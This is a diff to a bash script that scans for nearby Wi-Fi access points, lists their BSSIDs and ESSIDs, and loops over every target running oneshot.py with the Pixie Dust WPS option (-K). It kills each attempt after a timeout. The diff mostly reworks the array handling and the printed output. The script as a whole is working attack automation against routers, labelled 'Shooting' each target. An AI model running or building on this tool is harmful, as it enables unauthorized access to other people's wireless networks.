@@ -36,21 +36,34 @@ sed --expression='s/(on//g')
 
 if [ "$TARGETS" ]
 then
+	echo
 	echo "[+] Found targets:"
-	echo "$TARGETS"
 else
 	echo "[-] No targets found"
 	exit
 fi
 
-TARGETS_BSSIDS=$(echo "$TARGETS" | awk '{print $1}')
+for BSSID in $(echo "$TARGETS" | awk '{print $1}')
+do
+	BSSIDS+=($BSSID)
+done
 
-for TARGET in $TARGETS_BSSIDS
+for ESSID in $(echo "$TARGETS" | awk '{print $2}')
+do
+	ESSIDS+=($ESSID)
+done
+
+for TARGET in ${!BSSIDS[@]}
+do
+	echo -e "[+] ${BSSIDS[$TARGET]}\t${ESSIDS[$TARGET]}"
+done
+
+for TARGET in ${!BSSIDS[@]}
 do
 	echo
-	echo "[+] Shooting $TARGET"
-	python oneshot.py --bssid $TARGET -K -F -i $IFACE -w || true && killall sleep 2> /dev/null &
-	sleep $TIMEOUT && echo "[-] Timeout!"
+	echo "[+] Shooting ${BSSIDS[$TARGET]} - ${ESSIDS[$TARGET]}"
+	python oneshot.py --bssid ${BSSIDS[$TARGET]} -K -F -i $IFACE -w 2>/dev/null || true && killall sleep 2> /dev/null &
+	sleep $TIMEOUT > /dev/null && echo "[-] Timeout!"
 	
 	PIDS="1"
 	while [ "$PIDS" ]
@@ -58,7 +71,7 @@ do
 		PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
 		for PID in $PIDS
 		do
-			kill -9 $PID 2> /dev/null
+			kill -9 $PID > /dev/null
 			echo "[*] Killed oneshot process"
 		done
 		sleep 1
